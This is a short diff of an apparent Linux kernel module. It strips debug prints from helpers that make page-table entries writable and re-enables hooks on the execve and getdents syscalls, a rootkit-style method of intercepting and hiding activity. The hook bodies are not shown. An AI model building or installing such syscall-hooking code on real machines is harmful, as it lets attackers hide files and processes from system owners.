@@ -63,15 +63,12 @@ void set_addr_rw(const unsigned long addr)
   //Get the page table entry structure containing the address we pass.
   //Level will be set to the page depth for the entry.
   pte_t *pte = lookup_address(addr, &level);
-  printk(KERN_INFO "lookup_address function did not crash in rw\n");
 
   //If the page permissions bitmask doesn't have _PAGE_RW, mask it in
   //with the _PAGE_RW flag.
   if(pte->pte &~ _PAGE_RW) {
-    printk(KERN_INFO "Went into if in lookup_address\n");
     pte->pte |= _PAGE_RW;
   }
-  printk(KERN_INFO "After if in lookup_address\n");
 }
 
 /*
@@ -82,7 +79,6 @@ void set_addr_ro(const unsigned long addr)
   unsigned int level;
 
   pte_t *pte = lookup_address(addr, &level);
-  printk(KERN_INFO "lookup_address function did not crash in ro\n");
   pte->pte = pte->pte &~_PAGE_RW;
 }
 
@@ -216,8 +212,7 @@ int init_module(void)
 
   //Hook the syscall
   //hook_syscall(new_hook(__NR_open, (void*) &new_open)); //Uncomment to hook open()
-  // TODO Add me back
- // hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
+  hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
   hook_syscall(new_hook(__NR_getdents, (void*) &new_getdents));
   printk(KERN_ALERT "After call to hook_syscall\n");
 
